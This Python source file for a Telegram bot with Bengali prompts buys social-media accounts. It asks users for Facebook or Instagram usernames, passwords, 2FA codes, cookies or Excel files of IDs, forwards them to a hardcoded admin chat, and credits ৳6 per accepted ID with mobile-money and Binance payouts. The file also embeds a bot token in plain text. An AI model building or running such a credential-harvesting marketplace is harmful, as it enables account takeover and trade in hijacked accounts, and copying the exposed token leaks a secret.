import sqlite3
import threading
from flask import Flask
from telegram import ReplyKeyboardMarkup, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

# --- KEEP ALIVE ---
app_flask = Flask('')
@app_flask.route('/')
def home(): return "Bot is Alive!"
def keep_alive(): threading.Thread(target=lambda: app_flask.run(host='0.0.0.0', port=8080), daemon=True).start()

# কনফিগারেশন
TOKEN = "8797001893:AAFjzHbtNGcibUu0zewY9QdOml-94bOogXE"
ADMIN_ID = 7541488098

# স্টেট নির্ধারণ
GET_USERNAME, GET_PASS, GET_2FA, SET_WITHDRAW_VAL, ADMIN_ADD_MONEY, GET_PAY_ADDR = range(6)

# ডাটাবেস ফাংশন
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (user_id INTEGER PRIMARY KEY, username TEXT, balance REAL DEFAULT 0.0, 
                       bkash TEXT, nagad TEXT, rocket TEXT, binance TEXT, 
                       last_withdraw_amount REAL DEFAULT 0.0, withdraw_date TEXT)''')
    conn.commit()
    conn.close()

def get_main_menu():
    keyboard = [['🚀 Work Start'], ['📜 Rules', '💰 Price List'], ['💳 Payment Withdraw'], ['🔄 Restart']]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    conn = sqlite3.connect('bot_data.db'); cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user.id, user.username))
    conn.commit(); conn.close()
    context.user_data.clear()
    await update.message.reply_text("স্বাগতম! কাজ শুরু করতে নিচের বাটন ব্যবহার করুন।", reply_markup=get_main_menu())
    return ConversationHandler.END

async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if not text: return

    # --- মেইন মেনু অপশন ---
    if 'Work Start' in text:
        await update.message.reply_text('Category:', reply_markup=ReplyKeyboardMarkup([['🔵 Facebook'], ['🟠 Instagram'], ['🔄 Restart']], resize_keyboard=True))
    
    elif 'Facebook' in text:
        context.user_data['cat'] = "Facebook"
        await update.message.reply_text("কিভাবে পাঠাতে চান?", reply_markup=ReplyKeyboardMarkup([['📁 File'], ['🆔 Single ID'], ['🔄 Restart']], resize_keyboard=True))
    
    elif 'Instagram' in text:
        await update.message.reply_text('IG Options:', reply_markup=ReplyKeyboardMarkup([['🍪 Cookies'], ['🔐 2fa'], ['📱 Number2fa'], ['🔄 Restart']], resize_keyboard=True))
    
    # --- IG সাব-ক্যাটাগরি লজিক ---
    elif text in ['🍪 Cookies', '🔐 2fa', '📱 Number2fa']:
        context.user_data['cat'] = f"IG {text}"
        await update.message.reply_text(f"{text} এর জন্য অপশন সিলেক্ট করুন:", reply_markup=ReplyKeyboardMarkup([['📁 File'], ['🆔 Single ID'], ['🔄 Restart']], resize_keyboard=True))

    elif 'Single ID' in text:
        await update.message.reply_text('ধাপ ১: ইউজারনেম দিন:', reply_markup=get_main_menu())
        return GET_USERNAME

    elif 'File' in text:
        await update.message.reply_text("দয়া করে আপনার Excel (.xlsx) ফাইলটি পাঠান।", reply_markup=get_main_menu())

    elif 'Payment Withdraw' in text:
        user_id = update.message.from_user.id
        conn = sqlite3.connect('bot_data.db'); cursor = conn.cursor(); cursor.execute("SELECT balance FROM users WHERE user_id=?", (user_id,)); row = cursor.fetchone(); conn.close()
        balance = row[0] if row else 0.0
        msg = f"💰 আপনার ব্যালেন্স: ৳{balance}\n⚠️ উইথড্র লিমিট: ৳৫০\n\nপেমেন্ট মেথড সেট করে রিকোয়েস্ট পাঠান।"
        kb = [[InlineKeyboardButton("Bkash", callback_data="set_bkash"), InlineKeyboardButton("Nagad", callback_data="set_nagad")],
              [InlineKeyboardButton("Rocket", callback_data="set_rocket"), InlineKeyboardButton("Binance", callback_data="set_binance")],
              [InlineKeyboardButton("✅ Save & Withdraw Request", callback_data="req_withdraw")]]
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(kb))

    elif 'Restart' in text: return await start(update, context)

# --- সাবমিশন প্রসেস (Cookies vs Others) ---
async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text in ['🔄 Restart', '🚀 Work Start']: return await start(update, context)
    context.user_data['u_name'] = update.message.text
    await update.message.reply_text('ধাপ ২: পাসওয়ার্ড দিন:', reply_markup=get_main_menu())
    return GET_PASS

async def get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text in ['🔄 Restart', '🚀 Work Start']: return await start(update, context)
    context.user_data['u_pass'] = update.message.text
    
    # কুকিজ হলে ২এফএ চাইবে না
    if context.user_data.get('cat') == "IG 🍪 Cookies":
        return await submit_id_final(update, context)
    
    # বাকি সব ক্যাটাগরিতে ২এফএ চাইবে
    await update.message.reply_text('ধাপ ৩: ২এফএ (2FA) কোড দিন:', reply_markup=get_main_menu())
    return GET_2FA

async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text in ['🔄 Restart', '🚀 Work Start']: return await start(update, context)
    context.user_data['u_2fa'] = update.message.text
    return await submit_id_final(update, context)

async def submit_id_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    u_name = context.user_data.get('u_name')
    u_pass = context.user_data.get('u_pass')
    u_2fa = context.user_data.get('u_2fa', 'N/A')
    cat = context.user_data.get('cat', 'General')
    
    admin_msg = f"📥 **New Single ID Submission**\nCategory: {cat}\nFrom: @{user.username}\n\nUser: `{u_name}`\nPass: `{u_pass}`\n2FA: `{u_2fa}`"
    kb = [[InlineKeyboardButton("৳6 Add", callback_data=f"add_6_{user.id}"), 
           InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user.id}")]]
    
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    await update.message.reply_text("আপনার আইডি সফলভাবে জমা হয়েছে!", reply_markup=get_main_menu())
    return ConversationHandler.END

# --- উইথড্র ও ফাইল বাটন হ্যান্ডলার ---
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    await query.answer()

    if data.startswith("set_"):
        context.user_data['editing_method'] = data.split("_")[1]
        await query.message.reply_text(f"আপনার {data.split('_')[1].capitalize()} অ্যাড্রেসটি লিখুন:")
        return GET_PAY_ADDR
    elif data == "req_withdraw":
        await query.message.reply_text("আপনি কত টাকা উইথড্র করতে চান? (সংখ্যা লিখুন)")
        return SET_WITHDRAW_VAL
    elif data.startswith("add_6_"):
        uid = int(data.split("_")[2])
        conn = sqlite3.connect('bot_data.db'); cursor = conn.cursor()
        cursor.execute("UPDATE users SET balance = balance + 6 WHERE user_id = ?", (uid,))
        conn.commit(); conn.close()
        await context.bot.send_message(chat_id=uid, text="✅ আপনার আইডির জন্য ৳6.0 যোগ করা হয়েছে।")
        await query.edit_message_reply_markup(reply_markup=None)
    elif data.startswith("reject_"):
        uid = int(data.split("_")[1])
        await context.bot.send_message(chat_id=uid, text="❌ দুঃখিত, আপনার আইডিটি রিজেক্ট করা হয়েছে।")
        await query.edit_message_text(text=query.message.text + "\n\n🚫 **Status: Rejected**")
    elif data.startswith("custom_"):
        context.user_data['target_user'] = data.split("_")[1]
        await context.bot.send_message(chat_id=ADMIN_ID, text="ইউজারের জন্য কত টাকা এড করবেন?")
        return ADMIN_ADD_MONEY

# --- পেমেন্ট ও এডমিন প্রসেস ---
async def save_pay_addr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    method = context.user_data.get('editing_method')
    update_val = update.message.text
    conn = sqlite3.connect('bot_data.db'); cursor = conn.cursor()
    cursor.execute(f"UPDATE users SET {method} = ? WHERE user_id = ?", (update_val, update.message.from_user.id))
    conn.commit(); conn.close()
    await update.message.reply_text(f"✅ {method.capitalize()} সেভ হয়েছে।", reply_markup=get_main_menu())
    return ConversationHandler.END

async def process_withdraw_req(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        user = update.message.from_user
        from datetime import datetime
        now = datetime.now().strftime("%Y-%m-%d %H:%M")
        conn = sqlite3.connect('bot_data.db'); cursor = conn.cursor()
        cursor.execute("UPDATE users SET last_withdraw_amount=?, withdraw_date=? WHERE user_id=?", (amount, now, user.id))
        cursor.execute("SELECT bkash, nagad, rocket, binance FROM users WHERE user_id=?", (user.id,))
        p = cursor.fetchone(); conn.commit(); conn.close()
        msg = f"🔔 **Withdraw Request**\nUser: @{user.username}\nAmount: ৳{amount}\n\nBkash: {p[0]}\nNagad: {p[1]}\nRocket: {p[2]}\nBinance: {p[3]}"
        await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
        await update.message.reply_text("✅ রিকোয়েস্ট পাঠানো হয়েছে।", reply_markup=get_main_menu())
    except: await update.message.reply_text("ভুল ইনপুট।")
    return ConversationHandler.END

async def admin_add_money_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        uid = context.user_data.get('target_user')
        conn = sqlite3.connect('bot_data.db'); cursor = conn.cursor()
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, uid))
        conn.commit(); conn.close()
        await context.bot.send_message(chat_id=uid, text=f"✅ আপনার একাউন্টে ৳{amount} যোগ হয়েছে।")
        await update.message.reply_text(f"৳{amount} এড করা হয়েছে।")
    except: await update.message.reply_text("সংখ্যা লিখুন।")
    return ConversationHandler.END

async def handle_docs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if update.message.document.file_name.lower().endswith('.xlsx'):
        caption = f"📄 **New Excel File**\nFrom: @{user.username}\nID: `{user.id}`"
        kb = [[InlineKeyboardButton("💰 Add Custom Money", callback_data=f"custom_{user.id}")]]
        await context.bot.send_document(chat_id=ADMIN_ID, document=update.message.document.file_id, caption=caption, reply_markup=InlineKeyboardMarkup(kb))
        await update.message.reply_text('ফাইলটি পাওয়া গেছে।', reply_markup=get_main_menu())
    else:
        await update.message.reply_text('❌ শুধু .xlsx ফাইল দিন।')

def main():
    init_db(); keep_alive()
    app = Application.builder().token(TOKEN).build()
    conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('Single ID'), handle_menu), CallbackQueryHandler(callback_handler, pattern="^(set_|req_withdraw|custom_)")],
        states={
            GET_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
            GET_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_pass)],
            GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa)],
            GET_PAY_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_pay_addr)],
            SET_WITHDRAW_VAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_req)],
            ADMIN_ADD_MONEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_money_process)],
        },
        fallbacks=[CommandHandler('start', start), MessageHandler(filters.Regex('Restart'), start)],
        allow_reentry=True
    )
    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_docs))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu))
    app.run_polling()

if __name__ == '__main__': main()
                                   
